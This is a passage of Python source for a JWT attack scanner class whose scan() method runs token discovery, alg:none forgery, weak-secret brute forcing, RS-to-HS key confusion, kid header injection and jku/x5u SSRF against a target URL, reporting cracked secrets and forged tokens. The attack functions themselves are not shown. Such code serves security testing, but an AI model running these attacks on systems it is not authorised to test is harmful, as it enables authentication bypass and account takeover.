                Checks for missing/expired exp, sensitive data,
                sequential sub (IDOR), weak algorithm, alg:none in use.

      Phase 6 — Header injection (kid / jku / x5u)
                Tests SQLi, path traversal, SSTI, CMDi in kid claim;
                SSRF via jku/x5u JWKS URL substitution.

      Phase 7 — JWKS discovery
                Finds public key endpoints; feeds keys into phase 4.

    Usage in app.py:
        analyzer = JWTAnalyzer(target_url=f"https://{domain}")
        results  = analyzer.scan()
        scan_results[scan_id]['jwt_analyzer'] = results
    """

    def __init__(
        self,
        target_url: str,
        known_tokens: Optional[List[str]] = None,
        extra_secrets: Optional[List[str]] = None,
        proxy: Optional[str] = None,
        timeout: float = 8.0,
        max_workers: int = 15,
        rate_delay: float = 0.2,
        skip_brute: bool = False,
        skip_active: bool = False,
    ):
        self.target_url    = target_url.rstrip("/")
        self.known_tokens  = known_tokens or []
        self.extra_secrets = extra_secrets or []
        self.proxy         = proxy
        self.timeout       = timeout
        self.max_workers   = max_workers
        self.rate_delay    = rate_delay
        self.skip_brute    = skip_brute
        self.skip_active   = skip_active

        parsed = urllib.parse.urlparse(self.target_url)
        self.domain = parsed.hostname or self.target_url

    # ------------------------------------------------------------------
    # Public scan
    # ------------------------------------------------------------------

    def scan(self) -> Dict:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        session = _build_session(self.proxy)
        t0      = time.monotonic()

        print(f"[jwt] target  : {self.target_url}")

        state = ScanState(
            target_url=self.target_url,
            tokens_found=[],
            findings=[],
            public_keys={},
        )

        # ── Phase 1: token discovery ───────────────────────────────────────
        print(f"[jwt] phase 1: token discovery")
        discovered = _discover_tokens(session, self.target_url, self.timeout, self.max_workers)

        # Merge caller-supplied tokens
        for raw in self.known_tokens:
            parsed = _parse_jwt(raw, "caller_supplied", "known_token")
            if parsed:
                discovered.append(parsed)

        state.tokens_found = list({t.raw: t for t in discovered}.values())
        print(f"[jwt]   found {len(state.tokens_found)} unique tokens")

        if not state.tokens_found:
            return {
                "target":          self.target_url,
                "tokens_found":    0,
                "total_findings":  0,
                "critical_count":  0,
                "findings":        [],
                "elapsed_seconds": round(time.monotonic() - t0, 2),
            }

        # ── Phase 7: JWKS discovery (before phase 4) ──────────────────────
        print(f"[jwt] phase 7: JWKS endpoint discovery")
        state.public_keys = _discover_jwks(session, self.target_url, self.timeout)
        print(f"[jwt]   {len(state.public_keys)} public keys found")

        # Domain-derived secret candidates
        domain_secrets = _domain_secrets(self.domain)
        all_extra = list(dict.fromkeys(self.extra_secrets + domain_secrets))

        all_findings: List[JWTFinding] = []

        for token in state.tokens_found:
            print(
                f"[jwt] analysing: alg={token.algorithm} "
                f"source={token.source_key} "
                f"sub={token.payload.get('sub','?')}"
            )

            # ── Phase 5: claim analysis (always run) ──────────────────────
            all_findings.extend(_analyse_claims(token))

            if self.skip_active:
                continue

            # ── Phase 2: alg:none ──────────────────────────────────────────
            print(f"  [jwt] phase 2: alg:none attack")
            all_findings.extend(_attack_alg_none(
                session, token, self.target_url, self.timeout, self.rate_delay
            ))

            # ── Phase 3: weak secret brute force ──────────────────────────
            if not self.skip_brute and token.algorithm.startswith("HS"):
                print(f"  [jwt] phase 3: weak secret brute force ({token.algorithm})")
                r = _attack_weak_secret(token, all_extra, self.max_workers)
                if r:
                    all_findings.append(r)
                    print(f"    [jwt] CRACKED: secret='{r.cracked_secret}'")

            # ── Phase 4: RS/ES → HS confusion ─────────────────────────────
            if token.algorithm in _RS_TO_HS_TARGETS and state.public_keys:
                print(f"  [jwt] phase 4: RS/ES→HS confusion")
                for kid, pub_key in list(state.public_keys.items())[:3]:
                    all_findings.extend(_attack_rs_hs_confusion(
                        session, token, pub_key,
                        self.target_url, self.timeout, self.rate_delay,
                    ))

            # ── Phase 6: kid / jku / x5u injection ────────────────────────
            if "kid" in token.header:
                print(f"  [jwt] phase 6a: kid injection")
                all_findings.extend(_attack_kid_injection(
                    session, token, self.target_url, self.timeout, self.rate_delay
                ))
            if "jku" in token.header or "x5u" in token.header:
                print(f"  [jwt] phase 6b: jku/x5u SSRF")
                all_findings.extend(_attack_jku_ssrf(
                    session, token, self.target_url, self.timeout, self.rate_delay
                ))

        # ── Post-process ───────────────────────────────────────────────────
        all_findings = _dedup_sort(all_findings)

        sev_counts: Dict[str, int] = {}
        for f in all_findings:
            sev_counts[f.severity] = sev_counts.get(f.severity, 0) + 1

        attack_types = list(dict.fromkeys(f.attack_type for f in all_findings))
        elapsed      = time.monotonic() - t0

        print(
            f"[jwt] done | "
            f"tokens={len(state.tokens_found)} "
            f"findings={len(all_findings)} "
            f"critical={sev_counts.get('critical',0)} "
            f"elapsed={elapsed:.1f}s"
        )

        return {
            "target":          self.target_url,
            "tokens_found":    len(state.tokens_found),
            "total_findings":  len(all_findings),
            "critical_count":  sev_counts.get("critical", 0),
            "severity_summary":sev_counts,
            "attack_types":    attack_types,
            "elapsed_seconds": round(elapsed, 2),
            "tokens": [
                {
                    "source":    t.source,
                    "source_key":t.source_key,
                    "algorithm": t.algorithm,
                    "header":    t.header,
                    "payload":   {
                        k: v for k, v in t.payload.items()
                        if k not in ("password", "secret", "private_key")
                    },
                    "has_signature": bool(t.signature_b64),
                }
                for t in state.tokens_found
            ],
            "findings": [
                {
                    "token_source":  f.token_source,
                    "source_key":    f.source_key,
                    "algorithm":     f.algorithm,
                    "attack_type":   f.attack_type,
                    "severity":      f.severity,
                    "title":         f.title,
                    "detail":        f.detail,
                    "cracked_secret":f.cracked_secret,
                    "forged_token":  f.forged_token,
                    "evidence":      f.evidence,
                    "cwe":           f.cwe,
                    "cvss":          f.cvss,
                }
                for f in all_findings
            ],
        }